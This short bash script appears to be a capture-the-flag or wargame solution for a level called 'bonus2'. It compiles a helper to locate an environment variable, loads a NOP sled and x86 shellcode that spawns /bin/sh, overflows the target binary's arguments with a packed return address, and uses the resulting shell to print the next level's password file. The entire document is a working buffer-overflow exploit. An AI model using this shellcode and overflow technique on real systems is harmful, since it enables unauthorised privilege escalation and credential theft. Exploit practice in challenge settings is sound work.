#!/bin/bash

gcc /tmp/getenv.c -o /tmp/getenv
chmod 777 /tmp/getenv*

function buildExploit {
    export LANG="nl"

    NOPSLED="'\x90' * 0xff"
    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    export SHELLCODE=`python -c "print $NOPSLED + '$SHELLCODE'"`

    SH_BIGENDIAN_ADDR=`/tmp/getenv SHELLCODE ~/bonus`
    SH_LILENDIAN_ADDR=`python -c "import struct; print struct.pack('<L', int('$SH_BIGENDIAN_ADDR', 16))"`

    ARG1=`python -c "print 'A' * 40"`
    ARG2=`python -c "print 'B' * 23 + '$SH_LILENDIAN_ADDR'"`
}

set -x
(buildExploit && ~/bonus2 $ARG1 $ARG2) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/user/bonus3/.pass)\n"
EOI